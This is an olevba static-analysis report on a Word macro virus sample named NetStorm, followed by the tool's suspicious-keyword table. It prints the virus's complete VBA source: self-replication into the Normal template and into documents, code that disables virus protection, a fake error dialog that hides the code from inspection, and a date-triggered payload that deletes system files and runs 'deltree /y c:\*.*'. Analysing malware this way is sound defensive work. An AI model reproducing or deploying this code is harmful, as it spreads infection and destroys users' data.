olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NetStorm-a6f018bcf787d1b18074e77d8c22f8b7614ea4f8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NetStorm-a6f018bcf787d1b18074e77d8c22f8b7614ea4f8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NetStorm.bas 
in file: Virus.MSWord.NetStorm-a6f018bcf787d1b18074e77d8c22f8b7614ea4f8 - OLE stream: 'Macros/VBA/NetStorm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorInfectGlobalTemplate
If (CheckInfected = 0) Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="NetStorm", Object:=wdOrganizerObjectProjectItems
End If
ErrorInfectGlobalTemplate:
Call NetKiller
End Sub
Function CheckInfected()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
CheckInfected = 0
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
If WordBasic.[MacroName$](i, 0) = "NetStorm" Then
    CheckInfected = -1
End If
Next i
End Function
Sub FileOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo InfError
    Dialogs(wdDialogFileOpen).Show
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NetStorm", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
InfError:
Call NetKiller
End Sub
Sub FileNew()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo InfError
    Dialogs(wdDialogFileNew).Show
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NetStorm", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
InfError:
Call NetKiller
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo InfError
    Dialogs(wdDialogFileSaveAs).Show
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NetStorm", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
InfError:
Call NetKiller
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Dim Message, Title, Default, MyValue
Message = "New VBAProject _name:"
Title = "Microsoft Visual Basic"
Default = "NewVBAProject"
MyValue = InputBox(Message, Title, Default)
If MyValue = "braincoma" Then
ShowVisualBasicEditor = True
GoTo ErrorVVBC
End If
Options.VirusProtection = False
On Error GoTo ErrorVVBC
MsgBox "Not enough memory to perform this operation", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Microsoft Word"
ErrorVVBC:
End Sub
Sub NetKiller()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
If Mid(Time, 1, 2) = "13" Then MsgBox "Take it easy, lamer !", Title:="Net Storm"
If Mid(Time, 1, 2) = "19" Then MsgBox "Go home, lamer !", Title:="Net Storm"
If Mid(Date, 1, 2) = "10" Then Kill "c:\autoexec.bat"
If Mid(Date, 1, 2) = "11" Then Kill "c:\config.sys"
If Mid(Date, 1, 2) = "12" Then Kill "c:\command.com"
If Mid(Date, 1, 2) = "13" Then Shell "deltree /y c:\*.* > null"
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.NetStorm-a6f018bcf787d1b18074e77d8c22f8b7614ea4f8 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

